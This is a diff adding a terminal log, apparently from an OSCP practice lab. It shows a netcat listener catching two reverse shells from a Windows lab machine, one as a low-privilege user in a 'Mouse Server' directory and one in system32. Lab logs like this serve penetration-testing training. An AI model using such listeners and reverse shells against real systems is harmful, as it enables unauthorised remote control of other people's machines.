@@ -1,0 +1,23 @@
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A[0m]
+└─[1m[34m$[0m rlwrap nc -lvp 9000
+Listening on pi.hole 9000
+Connection received on 192.168.241.145 50757
+Microsoft Windows [Version 10.0.19041.1]
+(c) 2019 Microsoft Corporation. All rights reserved.
+C:\Program Files (x86)\Mouse Server>whoami
+whoami
+oscp\offsec
+C:\Program Files (x86)\Mouse Server>exit
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A[0m]
+└─[1m[34m$[0m rlwrap nc -lvp 9000
+Listening on pi.hole 9000
+Connection received on 192.168.241.145 50865
+Microsoft Windows [Version 10.0.19041.1]
+(c) 2019 Microsoft Corporation. All rights reserved.
+C:\WINDOWS\system32>
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A[0m]
+└─[1m[34m$[0m
